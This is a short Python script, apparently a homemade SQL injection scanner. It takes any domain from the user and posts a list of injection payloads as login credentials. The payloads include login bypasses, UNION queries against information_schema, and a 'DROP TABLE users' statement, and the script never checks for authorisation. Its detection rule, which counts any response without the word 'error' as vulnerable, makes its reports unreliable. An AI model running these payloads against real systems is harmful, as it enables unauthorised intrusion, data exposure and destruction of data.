import requests
from datetime import datetime


# SQL injection patterns to test you can add what you want:
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "' OR 1=1 # ",
    "\" OR \"1\"=\"1",
    "admin' --",
    "admin' #",
    "' AND 1=2 --",
    "' UNION SELECT null, table_name FROM information_schema.tables --",
    "' UNION SELECT null, column_name FROM information_schema.columns --",
    "'; DROP TABLE users; --"
]

REPORT_FILE = "vulnerability_report.txt"

def scan_for_sql_injection(api_url, SQL_PAYLOADS):
    vulnerable = False
    with open("vulnerability_report.txt", "w") as report_file:
        report_file.write("SQL Injection Vulnerability Report\n")
        report_file.write("===================================\n\n")
        report_file.write(f"Target: {api_url}\n")
        report_file.write(f"Date: {datetime.now()}\n\n")
        
        
        for injection in SQL_PAYLOADS:
            payload = {
                'username': injection,
                'password': injection
            }
            response = requests.post(api_url, data=payload)
            if "error" not in response.text.lower():
                vulnerable = True
                report_file.write(f"Possible SQL injection vulnerability detected with payload: {injection}\n")
        
        if not vulnerable:
            report_file.write("No SQL injection vulnerabilities found.\n")

if __name__ == "__main__":
    
    domain = input("Enter the domain to test (e.g., http://example.com): ")
    
    # Ensure domain starts with http:// or https://
    if not domain.startswith("http://") and not domain.startswith("https://"):
        domain = "http://" + domain
    
    # Initialize report
    with open(REPORT_FILE, "w") as file:
        file.write(f"SQL Injection Scan Report\n")
        file.write(f"Target: {domain}\n")
        file.write(f"Date: {datetime.now()}\n\n")

    print(f"[INFO] Starting SQL injection test on {domain}")
    
    scan_for_sql_injection(domain, SQL_PAYLOADS)
    
    print(f"[INFO] Scan complete. Check the report: {REPORT_FILE}")
    
    print("Scan complete. Check vulnerability_report.txt for details.")
